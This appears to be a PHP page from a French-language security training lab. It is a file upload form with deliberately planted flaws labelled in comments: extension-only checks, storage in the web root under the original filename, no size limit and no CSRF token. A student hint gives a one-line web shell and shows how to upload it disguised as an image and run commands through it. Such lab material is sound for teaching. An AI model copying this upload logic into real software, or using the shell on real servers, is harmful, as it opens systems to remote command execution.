<?php
require_once 'config.php';

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];

    // ============================================================
    // FAILLE UPLOAD-01 : Pas de vérification du type MIME réel
    // Un attaquant peut uploader shell.php renommé en shell.jpg
    // ============================================================

    // ============================================================
    // FAILLE UPLOAD-02 : Vérification de l'extension uniquement
    // (et encore, insuffisante – double extension possible)
    // ============================================================
    $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
    $allowed = ['jpg', 'jpeg', 'png', 'gif'];  // ❌ FAILLE: vérification extension uniquement

    if (in_array(strtolower($ext), $allowed)) {
        // ============================================================
        // FAILLE UPLOAD-03 : Le fichier est stocké dans le web-root
        // et peut être exécuté directement via http://localhost:8080/uploads/shell.php
        // ============================================================
        $destination = __DIR__ . '/uploads/' . $file['name'];
        // ❌ FAILLE: nom original conservé + stockage dans web-root

        move_uploaded_file($file['tmp_name'], $destination);
        $message = "✅ Fichier uploadé : <a href='uploads/{$file['name']}'>{$file['name']}</a>";
    } else {
        $message = "❌ Extension non autorisée.";
    }

    // ============================================================
    // FAILLE UPLOAD-04 : Pas de limite de taille vérifiée en PHP
    // ============================================================
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Upload – Lab Sécurité</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 80px auto; padding: 0 20px; }
        h1 { color: #c0392b; }
        input[type=file] { margin: 16px 0; }
        button { background: #c0392b; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
        .msg { background: #e8f5e9; padding: 12px; border-radius: 4px; margin-top: 16px; }
        .hint { background: #fff8e1; padding: 12px; border-radius: 4px; margin-top: 20px; font-size: 13px; }
        a { color: #c0392b; }
    </style>
</head>
<body>

<h1>📤 Upload de fichier</h1>

<?php if ($message): ?>
    <div class="msg"><?= $message ?></div>
<?php endif; ?>

<!-- ============================================================
     FAILLE CSRF-03 : Pas de token CSRF sur le formulaire d'upload
     ============================================================ -->
<form method="POST" enctype="multipart/form-data">
    <label>Sélectionner un fichier :</label><br>
    <input type="file" name="file" required>
    <br>
    <button type="submit">Uploader</button>
</form>

<div class="hint">
    💡 <strong>Indice élève :</strong><br>
    Crée un fichier <code>shell.php</code> avec le contenu :
    <code>&lt;?php system($_GET['cmd']); ?&gt;</code><br>
    Renomme-le <code>shell.jpg</code> et uploade-le.<br>
    Puis accède à <code>/uploads/shell.jpg?cmd=ls</code>
</div>

</body>
</html>
